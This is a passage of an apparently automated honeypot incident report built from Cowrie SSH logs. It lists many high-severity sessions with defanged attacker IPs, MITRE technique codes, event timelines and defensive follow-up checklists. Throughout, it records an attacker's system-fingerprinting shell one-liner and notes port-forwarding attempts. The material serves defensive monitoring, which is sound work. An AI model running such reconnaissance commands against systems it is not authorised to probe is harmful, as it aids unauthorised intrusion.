| `2026-08-16 09:55:53` | `cowrie.session.params` |
| `2026-08-16 09:55:53` | `cowrie.command.input` |
| `2026-08-16 09:55:53` | `cowrie.command.input` |
| `2026-08-16 09:55:53` | `cowrie.command.input` |
| `2026-08-16 09:55:53` | `cowrie.command.input` |
| `2026-08-16 09:55:53` | `cowrie.command.input` |
| `2026-08-16 09:55:53` | `cowrie.command.success` |
| `2026-08-16 09:55:53` | `cowrie.command.input` |
| `2026-08-16 09:55:53` | `cowrie.command.input` |
| `2026-08-16 09:55:53` | `cowrie.command.input` |
| `2026-08-16 09:55:53` | `cowrie.command.input` |
| `2026-08-16 09:55:53` | `cowrie.log.closed` |
| `2026-08-16 09:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9294ef96d1c2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:57 |
| **Last Seen** | 2026-08-16 09:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:57:19` | `cowrie.session.connect` |
| `2026-08-16 09:57:19` | `cowrie.client.version` |
| `2026-08-16 09:57:19` | `cowrie.client.kex` |
| `2026-08-16 09:57:21` | `cowrie.login.success` |
| `2026-08-16 09:57:22` | `cowrie.session.params` |
| `2026-08-16 09:57:22` | `cowrie.command.input` |
| `2026-08-16 09:57:22` | `cowrie.command.input` |
| `2026-08-16 09:57:22` | `cowrie.command.input` |
| `2026-08-16 09:57:22` | `cowrie.command.input` |
| `2026-08-16 09:57:22` | `cowrie.command.input` |
| `2026-08-16 09:57:22` | `cowrie.command.success` |
| `2026-08-16 09:57:22` | `cowrie.command.input` |
| `2026-08-16 09:57:22` | `cowrie.command.input` |
| `2026-08-16 09:57:22` | `cowrie.command.input` |
| `2026-08-16 09:57:22` | `cowrie.command.input` |
| `2026-08-16 09:57:23` | `cowrie.log.closed` |
| `2026-08-16 09:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffc9a7fac718

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 09:58 |
| **Last Seen** | 2026-08-16 09:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 09:58:49` | `cowrie.session.connect` |
| `2026-08-16 09:58:49` | `cowrie.client.version` |
| `2026-08-16 09:58:49` | `cowrie.client.kex` |
| `2026-08-16 09:58:51` | `cowrie.login.success` |
| `2026-08-16 09:58:52` | `cowrie.session.params` |
| `2026-08-16 09:58:52` | `cowrie.command.input` |
| `2026-08-16 09:58:52` | `cowrie.command.input` |
| `2026-08-16 09:58:52` | `cowrie.command.input` |
| `2026-08-16 09:58:52` | `cowrie.command.input` |
| `2026-08-16 09:58:52` | `cowrie.command.input` |
| `2026-08-16 09:58:52` | `cowrie.command.success` |
| `2026-08-16 09:58:52` | `cowrie.command.input` |
| `2026-08-16 09:58:52` | `cowrie.command.input` |
| `2026-08-16 09:58:52` | `cowrie.command.input` |
| `2026-08-16 09:58:52` | `cowrie.command.input` |
| `2026-08-16 09:58:53` | `cowrie.log.closed` |
| `2026-08-16 09:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71fac95b3a0b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:00 |
| **Last Seen** | 2026-08-16 10:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:00:22` | `cowrie.session.connect` |
| `2026-08-16 10:00:22` | `cowrie.client.version` |
| `2026-08-16 10:00:22` | `cowrie.client.kex` |
| `2026-08-16 10:00:23` | `cowrie.login.success` |
| `2026-08-16 10:00:24` | `cowrie.session.params` |
| `2026-08-16 10:00:24` | `cowrie.command.input` |
| `2026-08-16 10:00:24` | `cowrie.command.input` |
| `2026-08-16 10:00:24` | `cowrie.command.input` |
| `2026-08-16 10:00:24` | `cowrie.command.input` |
| `2026-08-16 10:00:24` | `cowrie.command.input` |
| `2026-08-16 10:00:24` | `cowrie.command.success` |
| `2026-08-16 10:00:24` | `cowrie.command.input` |
| `2026-08-16 10:00:24` | `cowrie.command.input` |
| `2026-08-16 10:00:24` | `cowrie.command.input` |
| `2026-08-16 10:00:24` | `cowrie.command.input` |
| `2026-08-16 10:00:25` | `cowrie.log.closed` |
| `2026-08-16 10:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7adf741e622

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 10:01 |
| **Last Seen** | 2026-08-16 10:02 |
| **Session Duration** | 53s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:01:24` | `cowrie.session.connect` |
| `2026-08-16 10:01:31` | `cowrie.client.version` |
| `2026-08-16 10:01:31` | `cowrie.client.kex` |
| `2026-08-16 10:01:58` | `cowrie.login.success` |
| `2026-08-16 10:02:08` | `cowrie.session.params` |
| `2026-08-16 10:02:08` | `cowrie.command.input` |
| `2026-08-16 10:02:17` | `cowrie.log.closed` |
| `2026-08-16 10:02:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f154057a231

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:01 |
| **Last Seen** | 2026-08-16 10:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:01:58` | `cowrie.session.connect` |
| `2026-08-16 10:01:58` | `cowrie.client.version` |
| `2026-08-16 10:01:58` | `cowrie.client.kex` |
| `2026-08-16 10:01:59` | `cowrie.login.success` |
| `2026-08-16 10:02:00` | `cowrie.session.params` |
| `2026-08-16 10:02:00` | `cowrie.command.input` |
| `2026-08-16 10:02:00` | `cowrie.command.input` |
| `2026-08-16 10:02:00` | `cowrie.command.input` |
| `2026-08-16 10:02:00` | `cowrie.command.input` |
| `2026-08-16 10:02:00` | `cowrie.command.input` |
| `2026-08-16 10:02:00` | `cowrie.command.success` |
| `2026-08-16 10:02:00` | `cowrie.command.input` |
| `2026-08-16 10:02:00` | `cowrie.command.input` |
| `2026-08-16 10:02:00` | `cowrie.command.input` |
| `2026-08-16 10:02:00` | `cowrie.command.input` |
| `2026-08-16 10:02:01` | `cowrie.log.closed` |
| `2026-08-16 10:02:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa965ac0d2fb

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 10:03 |
| **Last Seen** | 2026-08-16 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:03:00` | `cowrie.session.connect` |
| `2026-08-16 10:03:00` | `cowrie.client.version` |
| `2026-08-16 10:03:00` | `cowrie.client.kex` |
| `2026-08-16 10:03:01` | `cowrie.login.success` |
| `2026-08-16 10:03:01` | `cowrie.session.params` |
| `2026-08-16 10:03:01` | `cowrie.command.input` |
| `2026-08-16 10:03:01` | `cowrie.log.closed` |
| `2026-08-16 10:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8c2ea1b0178

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:03 |
| **Last Seen** | 2026-08-16 10:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:03:37` | `cowrie.session.connect` |
| `2026-08-16 10:03:38` | `cowrie.client.version` |
| `2026-08-16 10:03:38` | `cowrie.client.kex` |
| `2026-08-16 10:03:38` | `cowrie.login.success` |
| `2026-08-16 10:03:39` | `cowrie.session.params` |
| `2026-08-16 10:03:39` | `cowrie.command.input` |
| `2026-08-16 10:03:39` | `cowrie.command.input` |
| `2026-08-16 10:03:39` | `cowrie.command.input` |
| `2026-08-16 10:03:39` | `cowrie.command.input` |
| `2026-08-16 10:03:39` | `cowrie.command.input` |
| `2026-08-16 10:03:39` | `cowrie.command.success` |
| `2026-08-16 10:03:39` | `cowrie.command.input` |
| `2026-08-16 10:03:39` | `cowrie.command.input` |
| `2026-08-16 10:03:39` | `cowrie.command.input` |
| `2026-08-16 10:03:39` | `cowrie.command.input` |
| `2026-08-16 10:03:39` | `cowrie.log.closed` |
| `2026-08-16 10:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff54a01448de

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:05 |
| **Last Seen** | 2026-08-16 10:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:05:25` | `cowrie.session.connect` |
| `2026-08-16 10:05:25` | `cowrie.client.version` |
| `2026-08-16 10:05:25` | `cowrie.client.kex` |
| `2026-08-16 10:05:26` | `cowrie.login.success` |
| `2026-08-16 10:05:27` | `cowrie.session.params` |
| `2026-08-16 10:05:27` | `cowrie.command.input` |
| `2026-08-16 10:05:27` | `cowrie.command.input` |
| `2026-08-16 10:05:27` | `cowrie.command.input` |
| `2026-08-16 10:05:27` | `cowrie.command.input` |
| `2026-08-16 10:05:27` | `cowrie.command.input` |
| `2026-08-16 10:05:27` | `cowrie.command.success` |
| `2026-08-16 10:05:27` | `cowrie.command.input` |
| `2026-08-16 10:05:27` | `cowrie.command.input` |
| `2026-08-16 10:05:27` | `cowrie.command.input` |
| `2026-08-16 10:05:27` | `cowrie.command.input` |
| `2026-08-16 10:05:27` | `cowrie.log.closed` |
| `2026-08-16 10:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b40983217cb9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-16 10:06 |
| **Last Seen** | 2026-08-16 10:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:06:25` | `cowrie.session.connect` |
| `2026-08-16 10:06:25` | `cowrie.client.version` |
| `2026-08-16 10:06:25` | `cowrie.client.kex` |
| `2026-08-16 10:06:25` | `cowrie.login.success` |
| `2026-08-16 10:06:25` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:06:25` | `cowrie.direct-tcpip.data` |
| `2026-08-16 10:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b1a43ce8380

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:07 |
| **Last Seen** | 2026-08-16 10:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:07:22` | `cowrie.session.connect` |
| `2026-08-16 10:07:22` | `cowrie.client.version` |
| `2026-08-16 10:07:22` | `cowrie.client.kex` |
| `2026-08-16 10:07:23` | `cowrie.login.success` |
| `2026-08-16 10:07:24` | `cowrie.session.params` |
| `2026-08-16 10:07:24` | `cowrie.command.input` |
| `2026-08-16 10:07:24` | `cowrie.command.input` |
| `2026-08-16 10:07:24` | `cowrie.command.input` |
| `2026-08-16 10:07:24` | `cowrie.command.input` |
| `2026-08-16 10:07:24` | `cowrie.command.input` |
| `2026-08-16 10:07:24` | `cowrie.command.success` |
| `2026-08-16 10:07:24` | `cowrie.command.input` |
| `2026-08-16 10:07:24` | `cowrie.command.input` |
| `2026-08-16 10:07:24` | `cowrie.command.input` |
| `2026-08-16 10:07:24` | `cowrie.command.input` |
| `2026-08-16 10:07:24` | `cowrie.log.closed` |
| `2026-08-16 10:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be4db9253ac8

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-08-16 10:07 |
| **Last Seen** | 2026-08-16 10:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:07:54` | `cowrie.session.connect` |
| `2026-08-16 10:07:55` | `cowrie.client.version` |
| `2026-08-16 10:07:55` | `cowrie.client.kex` |
| `2026-08-16 10:07:57` | `cowrie.login.success` |
| `2026-08-16 10:07:57` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0651f7db26b8

| Field | Detail |
|---|---|
| **Source IP** | `70.89.116[.]5` |
| **First Seen** | 2026-08-16 10:08 |
| **Last Seen** | 2026-08-16 10:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:08:03` | `cowrie.session.connect` |
| `2026-08-16 10:08:03` | `cowrie.client.version` |
| `2026-08-16 10:08:03` | `cowrie.client.kex` |
| `2026-08-16 10:08:05` | `cowrie.login.success` |
| `2026-08-16 10:08:05` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.89.116[.]5` to AbuseIPDB if not already reported
- [ ] Block `70.89.116[.]5` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0f5970a1ee9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:09 |
| **Last Seen** | 2026-08-16 10:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:09:02` | `cowrie.session.connect` |
| `2026-08-16 10:09:02` | `cowrie.client.version` |
| `2026-08-16 10:09:02` | `cowrie.client.kex` |
| `2026-08-16 10:09:04` | `cowrie.login.success` |
| `2026-08-16 10:09:05` | `cowrie.session.params` |
| `2026-08-16 10:09:05` | `cowrie.command.input` |
| `2026-08-16 10:09:05` | `cowrie.command.input` |
| `2026-08-16 10:09:05` | `cowrie.command.input` |
| `2026-08-16 10:09:05` | `cowrie.command.input` |
| `2026-08-16 10:09:05` | `cowrie.command.input` |
| `2026-08-16 10:09:05` | `cowrie.command.success` |
| `2026-08-16 10:09:05` | `cowrie.command.input` |
| `2026-08-16 10:09:05` | `cowrie.command.input` |
| `2026-08-16 10:09:05` | `cowrie.command.input` |
| `2026-08-16 10:09:05` | `cowrie.command.input` |
| `2026-08-16 10:09:05` | `cowrie.log.closed` |
| `2026-08-16 10:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cbe62ae850a

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-08-16 10:10 |
| **Last Seen** | 2026-08-16 10:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:10:19` | `cowrie.session.connect` |
| `2026-08-16 10:10:19` | `cowrie.client.version` |
| `2026-08-16 10:10:19` | `cowrie.client.kex` |
| `2026-08-16 10:10:22` | `cowrie.login.success` |
| `2026-08-16 10:10:22` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f5e6a7c8af3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:10 |
| **Last Seen** | 2026-08-16 10:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:10:36` | `cowrie.session.connect` |
| `2026-08-16 10:10:36` | `cowrie.client.version` |
| `2026-08-16 10:10:36` | `cowrie.client.kex` |
| `2026-08-16 10:10:38` | `cowrie.login.success` |
| `2026-08-16 10:10:39` | `cowrie.session.params` |
| `2026-08-16 10:10:39` | `cowrie.command.input` |
| `2026-08-16 10:10:39` | `cowrie.command.input` |
| `2026-08-16 10:10:39` | `cowrie.command.input` |
| `2026-08-16 10:10:39` | `cowrie.command.input` |
| `2026-08-16 10:10:39` | `cowrie.command.input` |
| `2026-08-16 10:10:39` | `cowrie.command.success` |
| `2026-08-16 10:10:39` | `cowrie.command.input` |
| `2026-08-16 10:10:39` | `cowrie.command.input` |
| `2026-08-16 10:10:39` | `cowrie.command.input` |
